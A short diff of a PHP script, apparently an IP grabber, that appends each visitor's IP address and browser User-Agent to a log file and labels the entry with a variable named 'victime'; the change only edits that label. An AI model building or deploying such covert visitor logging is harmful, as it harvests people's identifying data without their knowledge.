@@ -15,7 +15,7 @@ $agentutilisateur = " User-Agent: ";
 $naviguateur = $_SERVER['HTTP_USER_AGENT'];
 
 $fichier = 'ipadd.txt';
-$victime = "IP : ";
+$victime = "IP Adresse : ";
 $faxelh = fopen($fichier, 'a');
 fwrite($faxelh, $victime);
 fwrite($faxelh, $ipadresse);
